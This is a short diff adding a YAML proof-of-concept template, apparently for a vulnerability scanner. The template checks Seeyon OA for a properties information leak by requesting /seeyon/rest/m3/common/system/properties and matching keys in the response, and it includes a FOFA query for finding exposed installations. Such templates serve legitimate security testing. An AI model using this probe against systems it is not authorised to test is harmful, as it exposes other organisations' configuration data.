@@ -1,0 +1,15 @@
+id: poc-yaml-seeyon-properties-info-leak
+info:
+  name: 致远OA properties 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 致远互联-OA
+  fofa: app="致远互联-OA"
+requests:
+- method: GET
+  path: /seeyon/rest/m3/common/system/properties
+  expression: status_code == 200 && contains(body,"contractentry.projectNameCode")
+    && contains(body,"elearning.post.update") && contains(content_type,"application/json")
+variables: {}
+transport: http
